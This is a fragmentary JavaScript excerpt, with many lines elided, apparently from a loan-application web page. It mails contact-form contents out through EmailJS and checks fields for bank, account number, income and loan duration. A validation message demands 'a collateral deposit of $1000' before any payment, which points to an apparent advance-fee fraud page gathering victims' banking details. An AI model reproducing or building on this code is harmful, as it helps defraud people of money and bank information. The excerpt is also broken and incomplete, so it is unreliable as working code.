...
window.onload = function() {
    document.getElementById('contact-form').addEventListener('submit', function(event) {
        ...
        emailjs.sendForm("service_hmain26","template_useetyg", this)
        .then(function() {
            console.log('SUCCESS!');
...
function validate(){
    ...
    if(count === 1){
        ...
        A collateral deposit of $1000 is required before making any payment towards your account , 
...
setInterval(nub, 100)
function nub(){
    if(duration.value === "" || account.value === "" || bank.value === "Select your bank" || income.value === ""){
